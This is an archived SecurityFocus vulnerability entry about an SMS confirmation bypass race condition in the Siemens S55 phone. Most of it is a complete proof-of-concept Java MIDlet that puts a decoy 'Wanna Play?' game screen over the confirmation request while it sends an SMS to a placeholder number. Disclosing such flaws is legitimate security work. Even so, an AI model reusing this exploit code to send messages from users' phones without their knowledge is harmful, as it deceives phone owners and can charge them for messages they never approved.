source: https://www.securityfocus.com/bid/10227/info

Reportedly the Siemens S55 is affected by an SMS confirmation message bypass vulnerability. This issue is due to a race condition error that allows a malicious programmer to send SMS messages from unsuspecting cellular telephone user's telephones while obscuring the confirmation request.

This issue may allow a malicious programmer to develop an application that can send SMS messages without the cellular telephone user's knowledge.

        package hello;
        import javax.microedition.lcdui.*;
        import javax.microedition.midlet.*;
        import com.siemens.mp.game.Sound;
        import com.siemens.mp.gsm.*;
        import java.lang.*;
        import java.io.*;

        public class hello extends MIDlet implements CommandListener
        {
           static final String EXIT_COMMAND_LABEL = "Exit FtRs world";
           Display             display;
           static hello        hello;

           public void startApp (){
              HelloCanva kanvas = new HelloCanva();
              Scr2 scr2 = new Scr2();
              display = Display.getDisplay(this);
              // Menu
              Command exitCommand  = new Command(EXIT_COMMAND_LABEL , Command.SCREEN, 0);
              scr2.addCommand(exitCommand);
              scr2.setCommandListener(this);
              //Data

              // screen 1
              display.setCurrent(kanvas);
              mycall();
              // screen 2
              display.setCurrent(scr2);
              //destroyApp(false);
            }

            public void mycall(){

            String SMSstr= "Test";

            try {
                /* Send SMS VALIAD NUMEBER SHALL BE IN SERTED HERE*/
                        SMS.send("0170-Numder", SMSstr);
                }
                /* Exception handling */
                catch (com.siemens.mp.NotAllowedException ex) {
                // Some handling code ...
                }
                catch (IOException ex) {
                //Some handling code ...
                }
                catch (IllegalArgumentException ex) {
                // Some handling code ...
                }
          } //public viod call()

           protected void destroyApp (boolean b){
              display.setCurrent(null);
              this.notifyDestroyed();       // notify KVM
           }

           protected void pauseApp ()
           { }

           public void commandAction (Command c, Displayable d){
              destroyApp(false);
           }

        }

        class HelloCanva extends Canvas
        {
            public void paint (Graphics g)
            {
                String str = new String("Wanna Play?");
                g.setColor(0,0,0);
                g.fillRect(0, 0, getWidth(), getHeight());
                g.setColor(255,0,0);
                g.drawString(str, getWidth()/2,getHeight()/2, Graphics.HCENTER | Graphics.BASELINE);
                g.drawString("yes", (getWidth()/2)-35,(getHeight()/2)+35, Graphics.HCENTER | Graphics.BASELINE);
                g.drawString("no", (getWidth()/2)+35,(getHeight()/2)+35, Graphics.HCENTER | Graphics.BASELINE);
            }
        }
        class Scr2 extends Canvas
        {
            public void paint (Graphics g) {
                String str = new String("cool");
                g.setColor(0,0,0);
                g.fillRect(0, 0, getWidth(), getHeight());
                g.setColor(255,0,0);
                g.drawString(str, getWidth()/2,getHeight()/2, Graphics.HCENTER | Graphics.BASELINE);
            }
        }